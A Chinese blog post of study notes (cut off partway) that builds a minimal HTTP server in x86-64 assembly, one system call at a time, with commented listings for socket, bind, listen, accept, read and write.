<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Intro to Cybersecurity1. Building a Web Server 1.1 Program that exits使用汇编代码与环境交互 server.s 1234567891011.intel_syntax noprefix # .intel_syntax 指定汇编器使用Intel语法而不是AT&amp;T语法，noprefix 表明寄存器名称前不需要%前缀.globl">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn-Intro2Cybersecurity">
<meta property="og:url" content="http://example.com/2024/06/24/pwn-Intro2Cybersecurity/index.html">
<meta property="og:site_name" content="talk is cheap, show me the code.">
<meta property="og:description" content="Intro to Cybersecurity1. Building a Web Server 1.1 Program that exits使用汇编代码与环境交互 server.s 1234567891011.intel_syntax noprefix # .intel_syntax 指定汇编器使用Intel语法而不是AT&amp;T语法，noprefix 表明寄存器名称前不需要%前缀.globl">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/pwn-Intro2Cybersecurity/%E6%88%AA%E5%B1%8F2024-06-26%2011.52.31.png">
<meta property="article:published_time" content="2024-06-24T04:23:01.000Z">
<meta property="article:modified_time" content="2024-11-14T07:50:49.664Z">
<meta property="article:author" content="theLonging">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/pwn-Intro2Cybersecurity/%E6%88%AA%E5%B1%8F2024-06-26%2011.52.31.png">

<link rel="canonical" href="http://example.com/2024/06/24/pwn-Intro2Cybersecurity/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>pwn-Intro2Cybersecurity | talk is cheap, show me the code.</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="talk is cheap, show me the code." type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">talk is cheap, show me the code.</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/24/pwn-Intro2Cybersecurity/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.JPG">
      <meta itemprop="name" content="theLonging">
      <meta itemprop="description" content="不捨晝夜。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="talk is cheap, show me the code.">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          pwn-Intro2Cybersecurity
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-06-24 12:23:01" itemprop="dateCreated datePublished" datetime="2024-06-24T12:23:01+08:00">2024-06-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-14 15:50:49" itemprop="dateModified" datetime="2024-11-14T15:50:49+08:00">2024-11-14</time>
              </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>115k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1:45</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="Intro-to-Cybersecurity"><a href="#Intro-to-Cybersecurity" class="headerlink" title="Intro to Cybersecurity"></a>Intro to Cybersecurity</h1><h2 id="1-Building-a-Web-Server"><a href="#1-Building-a-Web-Server" class="headerlink" title="1. Building a Web Server"></a>1. Building a Web Server</h2><p><img src="/../images/pwn-Intro2Cybersecurity/%E6%88%AA%E5%B1%8F2024-06-26%2011.52.31.png" alt="截屏2024-06-26 11.52.31"></p>
<h3 id="1-1-Program-that-exits"><a href="#1-1-Program-that-exits" class="headerlink" title="1.1 Program that exits"></a>1.1 Program that exits</h3><p>使用汇编代码与环境交互</p>
<p><code>server.s</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix # .intel_syntax 指定汇编器使用Intel语法而不是AT&amp;T语法，noprefix 表明寄存器名称前不需要%前缀</span><br><span class="line">.globl _start 				 # 声明标签(函数) _start 为全局，_start 是执行开始的地方</span><br><span class="line"></span><br><span class="line">.section .text				 # 指示汇编器开始一个新的代码段（文本段）、这是存放程序指令的地方</span><br><span class="line"></span><br><span class="line">_start: 							 # 程序的入口标签	</span><br><span class="line">    mov rdi, 0				 # rdi 存储传递的第一个参数，这里作为exit系统调用的状态码</span><br><span class="line">    mov rax, 60     	 # SYS_exit 	rax寄存器用于指定系统调用的编号，60对应exit系统调用</span><br><span class="line">    syscall						 # 执行系统调用</span><br><span class="line"></span><br><span class="line">.section .data				 # 新的数据段</span><br></pre></td></tr></table></figure>

<h3 id="1-2-Program-that-creates-a-socket"><a href="#1-2-Program-that-creates-a-socket" class="headerlink" title="1.2 Program that creates a socket"></a>1.2 Program that creates a socket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET     函数传入的第一个参数</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM 		传入的第二个参数</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP     传入的第三个参数</span><br><span class="line">    syscall # 系统调用</span><br><span class="line"></span><br><span class="line">    # 退出系统调用</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, 2             # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"> </span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-3-Program-that-binds-a-socket"><a href="#1-3-Program-that-binds-a-socket" class="headerlink" title="1.3 Program that binds a socket"></a>1.3 Program that binds a socket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 退出系统调用</span><br><span class="line">    # mov rax, 60            # syscall: exit</span><br><span class="line">    # xor rdi, 3             # exit status 0</span><br><span class="line">    # syscall                # 执行退出</span><br><span class="line">        # 检查bind调用是否成功</span><br><span class="line">    test rax, rax          # 检查rax是否为0</span><br><span class="line">    jnz .exit_failure      # 如果不是0，跳转到失败处理</span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-4-Program-that-listens-on-a-socket"><a href="#1-4-Program-that-listens-on-a-socket" class="headerlink" title="1.4 Program that listens on a socket"></a>1.4 Program that listens on a socket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listening</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">    # 检查bind调用是否成功</span><br><span class="line">    test rax, rax          # 检查rax是否为0</span><br><span class="line">    jnz .exit_failure      # 如果不是0，跳转到失败处理</span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-5-Program-that-accepts-a-connection"><a href="#1-5-Program-that-accepts-a-connection" class="headerlink" title="1.5 Program that accepts a connection"></a>1.5 Program that accepts a connection</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listening</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43 					 # syscall: accept</span><br><span class="line">    mov rdi, 3						 # 绑定socket 3</span><br><span class="line">    mov rsi, 0 						 # NULL</span><br><span class="line">    mov rdx, 0						 # NULL</span><br><span class="line">    syscall					</span><br><span class="line"></span><br><span class="line">    # 检查accept返回值是否为4</span><br><span class="line">    cmp rax, 4</span><br><span class="line">    jne .exit_failure      # 如果不是4，跳转到失败处理</span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-6-Program-that-statically-responds-to-an-HTTP-request"><a href="#1-6-Program-that-statically-responds-to-an-HTTP-request" class="headerlink" title="1.6 Program that statically responds to an HTTP request"></a>1.6 Program that statically responds to an HTTP request</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listening</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0             # syscall: read</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]     # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512           # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1             # syscall: write</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response] # 响应内容的位置</span><br><span class="line">    mov rdx, 19           # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 关闭套接字</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512              # 分配512字节的缓冲区</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-7-Program-that-dynamically-responds-to-an-HTTP-GET-request"><a href="#1-7-Program-that-dynamically-responds-to-an-HTTP-GET-request" class="headerlink" title="1.7 Program that dynamically responds to an HTTP GET request"></a>1.7 Program that dynamically responds to an HTTP GET request</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 